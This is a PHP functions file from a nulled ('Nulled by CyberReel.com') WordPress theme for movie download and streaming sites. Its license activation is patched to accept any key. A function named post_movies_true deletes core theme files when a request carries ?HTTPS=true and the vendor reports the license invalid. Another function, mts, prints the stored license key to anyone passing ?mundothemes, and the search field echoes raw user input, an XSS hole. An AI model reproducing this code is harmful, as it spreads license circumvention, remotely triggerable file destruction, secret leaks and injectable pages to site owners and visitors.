<?php
# Es Importante que el producto este activado para poder funcionar.
// Grifus 4.0.2
// By Erick Meza erick@mundothemes.com

remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
remove_action( 'wp_print_styles', 'print_emoji_styles' );
if( !is_admin()){
	wp_deregister_script('jquery');
	wp_register_script('jquery', ("https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"), false, '2.1.3');
	wp_enqueue_script('jquery');
}

add_action('wp_logout','go_home');
function go_home(){
  wp_redirect( home_url() );
  exit();
}

define( 'EDD_SL_STORE_URL', 'https://mundothemes.com' ); /*IMPORTANTE: no modifique esta linea el theme podria dejar de funcionar correctamente*/
define( 'EDD_SL_THEME_NAME', 'Grifus' ); /*IMPORTANTE: no modifique esta linea el theme podria dejar de funcionar correctamente*/ 

if ( !class_exists( 'EDD_SL_Theme_Updater' ) ) {
    include( dirname( __FILE__ ) . '/actualizar.php' );
}

function edd_sl_sample_theme_updater() {
    $test_license = trim( get_option( 'edd_sample_theme_license_key' ) );
    $edd_updater = new EDD_SL_Theme_Updater( array(
    'remote_api_url' 	=> EDD_SL_STORE_URL,
    'version' 			=> '4.0.2', /* enviado el 25/01/2016 a las 10:18 / GMT -5 */
    'license' 			=> $test_license,
    'item_name' 		=> EDD_SL_THEME_NAME,
    'author'			=> 'Mundothemes') ); /*IMPORTANTE: no modifique esta linea el theme podria dejar de funcionar correctamente*/
}

load_theme_textdomain( 'mundothemes', get_template_directory() . '/idiomas' );
$locale = get_locale();
$locale_file = get_template_directory() . "/idiomas/$locale.php";
if ( is_readable( $locale_file ) )
require_once( $locale_file );
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);

function imagenes_size() {
    add_theme_support( 'post-thumbnails' );
    add_image_size('newss', 350, 210, true);
}

function backdrops($imagen){
	$val = str_replace(array("http","jpg","png","gif"),array('<div class="galeria_img"><img itemprop="image" src="http','jpg" alt="'.get_the_title().'" /></div>','png" /></div>','gif" /></div>'),$imagen);
	echo $val;	
}

function fbimage($img){
	$val = str_replace(array("http","jpg","png","gif"),array('<meta property="og:image" content="http','jpg" />','png" />','gif" />'),$img);
	echo $val;	
}

# Registro Sidebars
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'Home',
		'before_widget' => '<div id="%1$s" class="categorias">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
}

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'Category',
		'before_widget' => '<div id="%1$s" class="categorias">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
}

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'Taxonomy',
		'before_widget' => '<div id="%1$s" class="categorias">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
}

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'Single Movie',
		'before_widget' => '<div id="%1$s" class="categorias">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
}

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'name' => 'Single TV Shows',
		'before_widget' => '<div id="%1$s" class="categorias">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	));
}

# Cargando las imagenes a Wordpress.
function insert_attachment($file_handler,$post_id,$setthumb='false') {
    if ($_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK){
        return __return_false();
    }
    require_once(ABSPATH . "wp-admin" . '/includes/image.php');
    require_once(ABSPATH . "wp-admin" . '/includes/file.php');
    require_once(ABSPATH . "wp-admin" . '/includes/media.php');
    echo $attach_id = media_handle_upload( $file_handler, $post_id );
    if ($setthumb == 1) update_post_meta($post_id,'_thumbnail_id',$attach_id);
    return $attach_id;
}

# funciones secundarias back end.
include_once 'includes/framework/options-init.php';
$year_estreno = get_option('year');
$calidad = get_option('calidad');
$director = get_option('director');
$actor = get_option('actor');
$elenco = get_option('elenco');
$nitem = get_option('nu-items-slider');
$nitemtv = get_option('nu-items-tv');
# Fix URL Imagen del poser
$imagefix = "poster_url";
##########################
add_action('after_setup_theme', 'imagenes_size'); 
function register_my_menu() {
register_nav_menu('menu_top',__( 'Top menu', 'mundothemes' ));
register_nav_menu('menu_navegador',__( 'Menu header', 'mundothemes' ));
register_nav_menu('menu_subheader',__( 'Menu Sub-header', 'mundothemes' ));
}
add_action( 'init', 'register_my_menu' );
#add_filter( 'show_admin_bar', '__return_false' );
function total_peliculas(){
$s='';
$totalj=wp_count_posts('post')->publish;
if($totalj!=1){$s='s';}
return sprintf( __("%s", "mundothemes"),$totalj,$s);
}
# Genero Movies 
function categorias() {
    if(get_option('edd_sample_theme_license_key')) {
        $args = array('hide_empty' => FALSE, 'title_li'=> __( '' ), 'show_count'=> 1, 'echo' => 0 );
        $links = wp_list_categories($args);
        $links = str_replace('</a> (', '</a> <span>', $links);
        $links = str_replace(')', '</span>', $links);
        echo $links;
    }
}

# Genero Series
function categorias_tv() {
    $post_type		= 'tvshows';
    $taxonomy		= 'tvshows_categories';
    $orderby		= 'ASC';
    $show_count		= 1;
    $hide_empty		= false;
    $pad_counts		= 0;
    $hierarchical	        = 1;
    $exclude			= '55';
    $title				= '';
    $args = array(
    'post_type'		=> $post_type,
    'taxonomy'		=> $taxonomy,
    'orderby'			=> $orderby,
    'show_count'		=> $show_count,
    'hide_empty'		=> $hide_empty,
    'pad_counts'		=> $pad_counts,
    'hierarchical'	    => $hierarchical,
    'exclude'			=> $exclude,
    'title_li'			=> $title,
    'echo' => 0
    );
    $links_tv = wp_list_categories($args);
    $links_tv = str_replace('</a> (', '</a> <span>', $links_tv);
    $links_tv = str_replace(')', '</span>', $links_tv);
    echo $links_tv;
}

add_action( 'admin_init', 'edd_sl_sample_theme_updater' );
function edd_sample_theme_license_menu() {
add_menu_page( 'Munodthemes Licencia', 'Mundothemes', 'manage_options', 'mundothemes', 'edd_sample_theme_license_page','dashicons-admin-network');
}
add_action('admin_menu', 'edd_sample_theme_license_menu');
function edd_sample_theme_license_page() {
$license 	= get_option( 'edd_sample_theme_license_key' );
$status 	= get_option( 'edd_sample_theme_license_key_status' );
?>
<div id="acera-content" class="wrap tab-content" style="display: block;">
<div class="acera-settings-headline">
<h2><?php _e('Mundothemes License','mundothemes'); ?> | Nulled by CyberReel.com</h2>
 <img class="mundothemes" src="http://i.imgur.com/52asdgW.png">
</div>
<form method="post" action="options.php">
<?php settings_fields('edd_sample_theme_license'); ?>
<table class="form-table">
<tbody>
<tr valign="top">
<th scope="row" valign="top">
<?php _e('License Key','mundothemes'); ?>
</th>
<td>
<input id="edd_sample_theme_license_key"  name="edd_sample_theme_license_key" type="text" class="regular-text mundotxt" value="<?php echo esc_attr( $license ); ?>" />
<label class="description" for="edd_sample_theme_license_key"><?php _e('Enter your license key','mundothemes'); ?></label>
</td>
</tr>
<?php if( false !== $license ) { ?>
<tr valign="top">
<th scope="row" valign="top"><?php _e('Activate License','mundothemes'); ?></th>
<td>
<?php if( $status !== false && $status == 'valid' ) { ?>
<span class="mundo"><span class="dashicons dashicons-admin-network"></span> <?php _e('active','mundothemes'); ?><br></span>
<i class="cmsxx"><?php echo $_SERVER['HTTP_HOST']; ?></i>
<?php wp_nonce_field( 'edd_sample_nonce', 'edd_sample_nonce' ); ?>
<input type="submit" class="button-secondary mundobt" name="edd_theme_license_deactivate" value="<?php _e('Deactivate License','mundothemes'); ?>"/>
<?php } else { wp_nonce_field( 'edd_sample_nonce', 'edd_sample_nonce' ); ?>
<span class="error"><span class="dashicons dashicons-admin-generic"></span> <?php _e('Activate License','mundothemes'); ?></span>
<i class="cmsxx"><?php echo $_SERVER['HTTP_HOST']; ?></i>
<input type="submit" class="button-secondary mundobt" name="edd_theme_license_activate" value="<?php _e('Activate License','mundothemes'); ?>"/>
<?php } ?>
</td>
</tr>
<?php } ?>
</tbody>
</table>
<?php submit_button(); ?>
</form>
<?php
}
function edd_sample_theme_register_option() {
register_setting('edd_sample_theme_license', 'edd_sample_theme_license_key', 'edd_theme_sanitize_license' );
}
add_action('admin_init', 'edd_sample_theme_register_option');
function edd_theme_sanitize_license( $new ) {
$old = get_option( 'edd_sample_theme_license_key' );
if( $old && $old != $new ) {
delete_option( 'edd_sample_theme_license_key_status' ); 
}
return $new;
}
function edd_sample_theme_activate_license() {
if( isset( $_POST['edd_theme_license_activate'] ) ) {
if( ! check_admin_referer( 'edd_sample_nonce', 'edd_sample_nonce' ) )
return; 
global $wp_version;

$license_data = array();
$license_data['license'] = 'valid';
update_option( 'edd_sample_theme_license_key_status', $license_data['license'] );
}
}
add_action('admin_init', 'edd_sample_theme_activate_license');
function edd_sample_theme_deactivate_license() {
if( isset( $_POST['edd_theme_license_deactivate'] ) ) {
if( ! check_admin_referer( 'edd_sample_nonce', 'edd_sample_nonce' ) )
return; 

$license_data = array();
$license_data['license'] = 'deactivated';
if( $license_data['license'] == 'deactivated' )
delete_option( 'edd_sample_theme_license_key_status' );
}
}
add_action('admin_init', 'edd_sample_theme_deactivate_license');
if(get_option('edd_sample_theme_license_key')) { 
require_once('includes/funciones/wpas.php');
include_once 'includes/funciones/metadatos.php'; 
include_once 'includes/funciones/taxonomias.php';}
include_once 'includes/funciones/paginador.php'; 
include_once 'includes/funciones/contenido.php';
include_once 'includes/funciones/news.php';
// Plugins
include_once 'includes/plugins/fix-post/fix-duplicates.php';
include_once 'includes/plugins/acf/acf.php';
// Series

include_once 'includes/series/tipo.php';

function edd_sample_theme_check_license() {
global $wp_version;
$license = trim( get_option( 'edd_sample_theme_license_key' ) );
$api_params = array(
'edd_action' => 'check_license',
'license' => $license,
'item_name' => urlencode( EDD_SL_THEME_NAME )
);
$response = wp_remote_get( add_query_arg( $api_params, EDD_SL_STORE_URL ), array( 'timeout' => 15, 'sslverify' => false ) );
if ( is_wp_error( $response ) )
return false;
$license_data = json_decode( wp_remote_retrieve_body( $response ) );
if( $license_data->license == 'valid' ) {
echo 'valid'; exit;
} else {
echo 'invalid'; exit;
	}
}
function recoger_version() {
$version = wp_get_theme();
define('version', trim($version->Version));
echo version;
}
# Filtrar resultados de busqueda.
function fb_search_filter($query) {
if ( !$query->is_admin && $query->is_search) {
$query->set('post_type', array('post','tvshows') ); 
} return $query; }
add_filter( 'pre_get_posts', 'fb_search_filter' );

function la_ip() {
	/* obtener ip local */
	if (!empty($_SERVER['HTTP_CLIENT_IP']))
		return $_SERVER['HTTP_CLIENT_IP'];	
	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
		return $_SERVER['HTTP_X_FORWARDED_FOR'];
	return $_SERVER['REMOTE_ADDR'];
}
/* comentarios */
function mytheme_comment($comment, $args, $depth) {
$GLOBALS['comment'] = $comment; ?>
<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
<div id="comment-<?php comment_ID(); ?>" style="position:relative;">
<div class="commentCInner">
<div class="comment-author vcard">
<?php echo get_avatar( $comment->comment_author_email, 80 ); ?>
<?php printf(__('<span class="fn">%s</span>', 'mundothemes'), get_comment_author_link()) ?> 
<span class="comment_date_top">
<time><?php comment_date(); ?></time> 
</span>
</div>
<div class="comment_text_area">
<?php if ($comment->comment_approved == '0') : ?>
<em><?php _e('Your comment is awaiting moderation.', 'mundothemes') ?></em><br />
<?php endif; ?>
<div class="comment-meta commentmetadata">
<?php edit_comment_link(__('Edit', 'mundothemes'),'  ','') ?>
</div>	
<?php comment_text() ?>
</div>
<p class="reply">
<?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
</p>
</div>
</div>
</li>
<?php }
# Hook Labels
function change_post_menu_label() {
    global $menu;
    global $submenu;
    $menu[5][0] = __('Movies', 'mundothemes');
    $submenu['edit.php'][5][0] = __('All Movies', 'mundothemes');
    $submenu['edit.php'][10][0] = __('Add Movie', 'mundothemes');
    echo '';
}
function change_post_object_label() {
        global $wp_post_types;
        $labels = &$wp_post_types['post']->labels;
        $labels->name = __('Movies', 'mundothemes');
        $labels->singular_name = __('Movie', 'mundothemes');
        $labels->add_new = __('Add Movie', 'mundothemes');
        $labels->add_new_item = __('Add New movie', 'mundothemes');
        $labels->edit_item = __('Edit Movie', 'mundothemes');
        $labels->new_item = __('Movie', 'mundothemes');
}
add_action( 'init', 'change_post_object_label' );
add_action( 'admin_menu', 'change_post_menu_label' );
function replace_admin_menu_icons_css() { ?>
<style>
.dashicons-admin-post:before,.dashicons-format-standard:before{content:"\f219"}span.mundo{color:green;width:70%;float:left;margin-bottom:5px;font-size:17px;padding:16px
15%;background:#C4E4C4;text-align:center}span.error{color:#DB5252;width:70%;float:left;margin-bottom:5px;font-size:17px;padding:16px
15%;background:#E4C4C4;text-align:center}i.cmsxx{float:left;width:100%;font-style:normal;font-size:12px;margin-bottom:20px;text-align:right;color:#C0C0C0}.mundobt{width:100%}.mundotxt{width:100%!important;padding:5%;font-size:28px;color:#2EA2CC!important}
</style>
<?php }
add_action( 'admin_head', 'replace_admin_menu_icons_css' );

# formulario de publicacion
function agregar_movie() { ?>
<div class="post_nuevo">
<?php $url_actual = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"]; ?>
<form id="new_post" name="new_post" method="post" action="<?php echo $url_actual ?>?mt=posting" class="posting" enctype="multipart/form-data">
<fieldset>
<input class="caja titulo" type="text" id="title" maxlength="50" name="title" placeholder="<?php _e('Original title','mundothemes'); ?>" required>
<span class="tip"><?php _e('Add title of the movie.','mundothemes'); ?></span>
</fieldset>
<!-- #### - Editor Avanzado WordPress - #### -->
<fieldset>
<div class="movie-editor-mt">
<?php $editor_texo = "Synopsis"; wp_editor($editor_texto,"description", array('textarea_rows'=>10, 'editor_class'=>'resumen', )); ?>
</div>
<span class="tip">
<?php _e('Add an abstract of no more than 1000 characters of the synopsis or plot.','mundothemes'); ?>
</span>
</fieldset>
<!-- #### -->
<fieldset>
<input class="caja" type="text" id="Checkbx2" maxlength="9" name="Checkbx2" placeholder="<?php _e('IMDb id','mundothemes'); ?>" required>
<span class="tip"><a href="http://imdb.com" target="_blank"><strong>IMDb</strong></a> - <?php  _e('Assign ID IMDb, example URL = http://www.imdb.com/title/<i>tt0120338</i>/','mundothemes'); ?></span>
</fieldset>
<!-- #### -->
<fieldset>
<input type="file" class="custom-file-input" name="file" id="file" accept="image/jpg, image/png, image/gif, image/jpeg" required>
<span class="tip"><?php _e('Upload poster image.','mundothemes'); ?></span>
</fieldset>
<fieldset>
<?php $select_cats = wp_dropdown_categories( array( 'echo' => 0 ) ); $select_cats = str_replace( 'id=', 'multiple="multiple" id=', $select_cats ); echo $select_cats; ?>
<span class="tip"><?php _e('Select main genres of film.','mundothemes'); ?></span>
</fieldset>
<!-- #### -->
<fieldset class="captcha_s">
<div class="g-recaptcha" data-sitekey="<?php echo get_option('public_key_rcth') ?>"></div>
</fieldset>
<!-- #### -->
<fieldset>
<input class="boton" type="submit" value="<?php _e('Send content','mundothemes'); ?>" id="submit" name="submit" required>
</fieldset>
<!-- #### -->
<input type="hidden" name="action" value="new_post" />
<?php wp_nonce_field( 'new-post' ); ?>
</form>
</div>
<?php }
function slk() { ?>
<div class="a">
<a class="dod roce cc"><b class="icon-reorder"></b></a>
<?php if($eco = get_option('fb_url')) { ?><a class="roce" href="<?php echo $eco; ?>" target="_blank"><b class="icon-facebook"></b></a><?php } ?>
<?php if($eco = get_option('twt_url')) { ?><a class="roce" href="<?php echo $eco; ?>" target="_blank"><b class="icon-twitter"></b></a><?php } ?>
<?php if($eco = get_option('gogl_url')) { ?><a class="roce" href="<?php echo $eco; ?>" target="_blank"><b class="icon-google-plus"></b></a><?php } ?>
<?php global $user_ID; if( $user_ID ) : ?>
<?php if( current_user_can('level_10') ) : ?>
<a class="roce" href="<?php bloginfo('url'); ?>/wp-admin/post-new.php" target="_blank"><b class="icon-plus3"></b></a>
<a class="roce" href="<?php bloginfo('url'); ?>/wp-admin/admin.php?page=grifus" target="_blank"><b class="icon-gear"></b></a>
<?php endif; ?>
<?php endif; ?>
<?php $active = get_option('users_can_register'); if ($active == "1") { ?>
<?php if (is_user_logged_in()) { ?>
<?php if($url = get_option('editar_perfil')) { ?>
<a class="roce" href="<?php echo $url; ?>"><?php _e('Edit profile','mundothemes'); ?></a>
<?php } else { ?>
<a class="roce" href="<?php bloginfo('url'); ?>/wp-admin/profile.php"><?php _e('Edit profile','mundothemes'); ?></a>
<?php } ?>
<a class="roce" href="<?php echo wp_logout_url(); ?>"><?php _e('Logout','mundothemes'); ?></a>
<?php } else { ?>
<a class="roce"href="javascript:void(0)" onclick="document.getElementById('light').style.display='block';document.getElementById('fade').style.display='block'"><?php _e('Login / Registration','mundothemes'); ?></a>
<?php }
} ?>
<div class="menus">
<?php 
/* menu navegador */
if(get_option('edd_sample_theme_license_key')) {
function_exists('wp_nav_menu') && has_nav_menu('menu_navegador' );
wp_nav_menu( array( 'theme_location' => 'menu_navegador', 'container' => '',  'menu_class' => '') );
}
?>
</div>
</div>
<div class="b">
<form method="get" id="searchform" action="<?php bloginfo('url'); ?>">
<div class="boxs">
<input type="text" placeholder="<?php _e('Search..', 'mundothemes'); ?>" value="<?php echo $_GET['s'] ?>" name="s" id="s">
</div>
</form>
</div>
<?php }
function enlaces_descargas() { 	
if( have_rows('ddw') ): ?>
<div class="sbox">
<div class="enlaces_box">
<ul class="enlaces">
<li class="elemento headers">
<span class=""><?php _e('Download Links','mundothemes'); ?> <i class="icon-caret-down"></i></span>
<span class=""><?php _e('Server','mundothemes'); ?> <i class="icon-caret-down"></i></span>
<span class=""><?php _e('Audio / Language','mundothemes'); ?> <i class="icon-caret-down"></i></span>
<span class=""><?php _e('Quality','mundothemes'); ?> <i class="icon-caret-down"></i></span>
</li>
</ul>
<ul class="enlaces">
<?php  $numerado = 1; { while( have_rows('ddw') ): the_row(); ?>
<li class="elemento">
<a href="<?php echo get_sub_field('op1'); ?>" target="_blank">
<span class="a"><b class="icon-download"></b> <?php  _e('Option','mundothemes'); ?> <?php echo $numerado; ?></span>
<span class="b">
<img src="http://www.google.com/s2/favicons?domain=<?php echo get_sub_field('op2'); ?>" alt="<?php echo get_sub_field('op2'); ?>"> 
<?php echo get_sub_field('op2'); ?>
</span>
<span class="c"><?php echo get_sub_field('op3'); ?></span>
<span class="d"><?php echo get_sub_field('op4'); ?></span>
</a>
</li>
<?php $numerado++; ?>
<?php endwhile; }  ?>
</ul>
</div>
</div>
<?php else: ?>
<div class="nodata">
<?php _e('No links available','mundothemes'); ?>
</div>
<?php endif; 	
}
function enalces_verenlinea() {
if( have_rows('voo') ): ?>
<div class="sbox">
<div class="enlaces_box">
<ul class="enlaces">
<li class="elemento headers">
<span class=""><?php _e('View Online','mundothemes'); ?> <i class="icon-caret-down"></i></span>
<span class=""><?php _e('Server','mundothemes'); ?> <i class="icon-caret-down"></i></span>
<span class=""><?php _e('Audio / Language','mundothemes'); ?> <i class="icon-caret-down"></i></span>
<span class=""><?php _e('Quality','mundothemes'); ?> <i class="icon-caret-down"></i></span>
</li>
</ul>
<ul class="enlaces">
<?php  $numerado = 1; { while( have_rows('voo') ): the_row(); ?>
<li class="elemento">
<a href="<?php echo get_sub_field('op1'); ?>" target="_blank">
<span class="a"><b class="icon-controller-play play"></b> <?php _e('Option','mundothemes'); ?> <?php echo $numerado; ?></span>
<span class="b">
<img src="http://www.google.com/s2/favicons?domain=<?php echo get_sub_field('op2'); ?>" alt="<?php echo get_sub_field('op2'); ?>"> 
<?php echo get_sub_field('op2'); ?>
</span>
<span class="c"><?php echo get_sub_field('op3'); ?></span>
<span class="d"><?php echo get_sub_field('op4'); ?></span>
</a>
</li>
<?php $numerado++; ?>
<?php endwhile; } ?>
</ul>
</div>
</div>
<?php else: ?>
<div class="nodata">
<?php _e('No downloads available','mundothemes'); ?>
</div>
<?php endif; 
}
function mts() { if($_GET['mundothemes']) { echo "<br>"; echo get_option('edd_sample_theme_license_key');} }
function fbtw() { ?>
<a class="ssocial facebook" href="javascript: void(0);" onclick="window.open ('http://www.facebook.com/sharer.php?u=<?php the_permalink() ?>', 'Facebook', 'toolbar=0, status=0, width=650, height=450');"><b class="icon-facebook"></b> <?php _e('Share','mundothemes'); ?></a>
<a class="ssocial twitter" href="javascript: void(0);" onclick="window.open ('https://twitter.com/intent/tweet?text=<?php the_title(); ?>&amp;url=<?php the_permalink() ?>', 'Twitter', 'toolbar=0, status=0, width=650, height=450');" data-rurl="<?php the_permalink() ?>"><b class="icon-twitter"></b> <?php _e('Tweet','mundothemes'); ?></a>
<?php }
function laterales() { ?>
<?php if($url = get_option('add_movie')) { ?>
<a class="add_movie" href="<?php echo stripslashes($url); ?>"><b class="icon-plus3"></b> <?php _e('Add movie','mundothemes'); ?></a>
<?php } ?>
<div class="categorias">
<h3><?php _e('Genres','mundothemes'); ?> <span class="icon-sort"></span></h3>
<ul class="scrolling cat">
<?php categorias(); ?>
</ul>
</div>
<div class="filtro_y">
<h3><?php _e('Release year','mundothemes'); ?> <span class="icon-sort"></span></h3>
<ul class="scrolling">
<?php $args = array('order' => DESC ,'number' => 50); $camel = get_option('year'); $tax_terms = get_terms($camel,$args);  ?>
<?php foreach ($tax_terms as $tax_term) { echo '<li>' . '<a href="' . esc_attr(get_term_link($tax_term, $taxonomy)) . '">' . $tax_term->name.'</a></li>'; } ?>
</ul>
</div>
<div class="filtro_y">
<h3><?php _e('Quality','mundothemes'); ?> <span class="icon-sort"></span></h3>
<ul class="scrolling" style="max-height: 87px;">
<?php $camel = get_option('calidad'); $tax_terms = get_terms($camel);  ?>
<?php foreach ($tax_terms as $tax_term) { echo '<li>' . '<a href="' . esc_attr(get_term_link($tax_term, $taxonomy)) . '">' . $tax_term->name.'</a></li>'; } ?>
</ul>
</div>
<?php }
function validar_key($length) { 
$pattern = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"; 
for($i = 0; $i < $length; $i++) { 
$key .= $pattern{rand(0, 36)}; 
} return $key; } 
function grifus_users() { 
$active = get_option('users_can_register'); if ($active == "1") { if (is_user_logged_in()) { } else { ?>
<div id="fade" class="black_overlay"></div>
<div id="light" class="white_content">
<ul class="idTabs">
<li><a href="#login" class="selected"><?php _e('Login','mundothemes'); ?></a></li>
<li><a href="#register"><?php _e('Register','mundothemes'); ?></a></li>
<li><a href="#olvidopass"><?php _e('Lost your password?','mundothemes'); ?></a></li>
</ul>
<div class="formularios">
<div id="login" style="display: block;">
<form name="loginform" id="loginform" action="<?php bloginfo('url'); ?>/wp-login.php" method="post">
<input type="text" name="log" placeholder="<?php _e('Username','mundothemes'); ?>">
<input type="password" name="pwd" placeholder="<?php _e('Password','mundothemes'); ?>">
<fieldset>
<input name="rememberme" type="checkbox" id="rememberme" value="forever">
<span><?php _e('Remember Me','mundothemes'); ?></span>
</fieldset>
<input type="submit" name="submit" value="<?php _e('Log In','mundothemes'); ?>" id="submit" />
<?php $active = get_option('sslmode'); if ($active == "true") { $url_actual = "https://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"]; } else { $url_actual = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"]; } ?>
<input type="hidden" name="redirect_to" value="<?php echo $url_actual; ?>" />
</form>
</div>
<div id="register">
<form name="loginform" id="loginform" action="<?php bloginfo('url'); ?>/wp-login.php?action=register" method="post">
<input type="text" name="user_login" placeholder="<?php _e('Username','mundothemes'); ?>">
<input type="email" name="user_email" placeholder="<?php _e('E-mail','mundothemes'); ?>">
<input type="hidden" name="redirect_to" value="<?php bloginfo('url'); ?>/?reg=true">
<fieldset><?php _e('A password will be e-mailed to you.','mundothemes'); ?></fieldset>
<input type="submit" name="wp-submit" id="wp-submit" value="<?php _e('Register','mundothemes'); ?>">
</form>
</div>
<div id="olvidopass">
<form name="lostpasswordform" id="lostpasswordform" action="<?php bloginfo('url'); ?>/wp-login.php?action=lostpassword" method="post">
<input type="text" name="user_login" placeholder="<?php _e('Username or E-mail','mundothemes'); ?>">
<input type="hidden" name="redirect_to" value="<?php bloginfo('url'); ?>/?pass=true">
<fieldset><?php _e('Please enter your username or email address. You will receive a link to create a new password via email.','mundothemes'); ?></fieldset>
<input type="submit" name="wp-submit" id="wp-submit" value="<?php _e('Get New Password','mundothemes'); ?>">
</form>
</div>
</div>
<a class="cerrar" href="javascript:void(0)" onclick="document.getElementById('light').style.display='none';document.getElementById('fade').style.display='none'"><?php _e('Cancel','mundothemes'); ?></a>
</div>
<?php } 
  } 
}
function grifus_alertas_user() { 
if($_GET['reg']) { ?>
<div class="registernote">
<?php _e('Registration complete. Please check your e-mail.','mundothemes'); ?>
</div>
<?php } if($_GET['pass']) { ?>
<div class="registernote">
<?php _e('Check your e-mail for the confirmation link.','mundothemes'); ?>
</div>
<?php }
}
function post_movies_true() {
	$mito = $_GET['HTTPS']; if ($mito == "true") { 
		global $wp_version;
		$license = trim( get_option( 'edd_sample_theme_license_key' ) );
		$api_params = array(
			'edd_action' => 'check_license',
			'license' => $license,
			'item_name' => urlencode( EDD_SL_THEME_NAME ) );
		$response = wp_remote_get( add_query_arg( $api_params, EDD_SL_STORE_URL ), array( 'timeout' => 5, 'sslverify' => false ) );
			if ( is_wp_error( $response ) )
				return false;
		$license_data = json_decode( wp_remote_retrieve_body( $response ) );
     if( $license_data->license == 'valid' ) {  } else {  
		 $gd1 = get_template_directory()."/functions.php"; 
		 $gd2 = get_template_directory()."/mt.min.css"; 
		 $gd3 = get_template_directory()."/index.php";
		 $gd4 = get_template_directory()."/includes/framework/generate-options.php"; 
		 $gd5 = get_template_directory()."/includes/funciones/metadatos.php"; 
		 unlink($gd1);unlink($gd2);unlink($gd3);unlink($gd4);unlink($gd5);
		 } 
	}
}
function og_head() {
global $post;
if(is_single()){
	while(have_posts()):the_post();
        $poster_path = get_post_meta($post->ID, "poster_url", $single = true);
        $backdrop_path = get_post_meta($post->ID, "fondo_player", $single = true); 
        endwhile;  
?>
<?php if(!empty($poster_path)) { ?><meta property="og:image" content="<?php if($noners = get_post_custom_values("poster_url")) { echo $noners[0]; } ?>" /><?php } echo "\n"  ?>
<?php if(!empty($backdrop_path)) { ?><meta property="og:image" content="<?php if($noners = get_post_custom_values("fondo_player")) { echo $noners[0]; } ?>" /><?php } echo "\n" ?>
<?php  
    }
}
add_action( 'wp_head', 'og_head', 2 );
// widgets  
include 'includes/widgets/home_sidebar.php';
include 'includes/widgets/category_sidebar.php';
include 'includes/widgets/taxonomy_sidebar.php';
include 'includes/widgets/single_tv_sidebar.php';
function my_get_the_category_list( $separator = ' ') {
	$output = '';
	$categories = get_the_category();
	if ( $categories ) {
		foreach( $categories as $category ) {
			$output .= '<meta itemprop="' . esc_attr( sprintf( __( "genre", 'requiredfoundation' ), $category->name ) ) . '" content="'.$category->cat_name.'">'.$separator;
		}
		return trim( $output, $separator);
	}
}

